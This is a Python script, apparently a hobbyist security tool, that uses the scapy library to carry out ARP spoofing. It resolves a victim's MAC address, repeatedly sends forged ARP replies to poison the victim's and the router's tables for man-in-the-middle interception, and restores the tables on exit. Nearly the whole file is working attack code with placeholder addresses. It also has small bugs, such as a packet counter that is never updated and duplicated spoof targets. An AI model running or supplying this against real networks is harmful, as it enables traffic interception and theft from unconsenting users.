#!/usr/bin/env python
# ------author Samuel Bonu


import scapy.all as scapy
import time
import os

# Broadcast MAC address
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

def mAc_harvester(ip_addr):
    """Create ARP request packet
    pdst is the field containing the IP we want to specify"""
    request_ARP = scapy.ARP(pdst=ip_addr)

    """Create Ethernet frame with the destination MAC address set to broadcast
    dst is the field containing the broadcast MAC address"""
    broadcAst = scapy.Ether(dst=BROADCAST_MAC)

    # Create a packet (to send) which contains both the ARP request and destination address (broadcast address)
    packet_arp = broadcAst/request_ARP

    """packet_arp.show() --show summary for packet_arp
    send packet...recieved= those who has ip will repond, un_recieved are the ip that didn't respond"""
    
    received_lst = scapy.srp(packet_arp, timeout=1)[0] #it's a list of two element,the first is the answered
    return received_lst[0][1].hwsrc

"""op is set 2(arp response) 1(arp request)
"""


def sp00f(v1ktim_addr, sp00f_addr):
    v1ktim_mac = mAc_harvester(v1ktim_addr)
    packet = scapy.ARP(op=2, pdst=v1ktim_addr, hwdst=v1ktim_mac, psrc=sp00f_addr)
    scapy.send(packet, verbose= False)

#restore connectivty after spoofing
def rest0r3(dst_ip_addr, src_ip_addr):
    dst_mac_addr = mAc_harvester(dst_ip_addr)
    src_mac_addr = mAc_harvester(src_ip_addr)
    packet = scapy.ARP(op=2, pdst=dst_ip_addr, hwdst=dst_mac_addr, psrc=src_ip_addr, hwsrc=src_mac_addr)
    scapy.send(packet, count=4, verbose=False) #count repeats the procedure the number of times specified 

packets_sent = 0
def main():
    try:
        while True:
            sp00f("ip_addr of victim","ip_addr to sp00f") # sp00f victim 
            sp00f("ip-addr of victim", "ip_addr tp sp00f") # sp00f router
            print(f'\r[+] Packets sent: [{packets_sent}]', end="") #comment: end="" adds nothing to the end of the line so no new line is printed. '\r' always prints from the start of the line
            time.sleep(2)
    except KeyboardInterrupt:
        print(f'[=] program interrupted by user...restoring ARP tables, please wait\n')
        rest0r3("ip_addr of victim","ip_addr to sp00f") # restor3 victim 
        rest0r3("ip-addr of victim", "ip_addr tp sp00f") # restor3 router
        


# Check if running as root
if __name__ == "__main__":
    if os.getuid() == 0:
        main()
    else:
        print('[-] Run the program as root')
        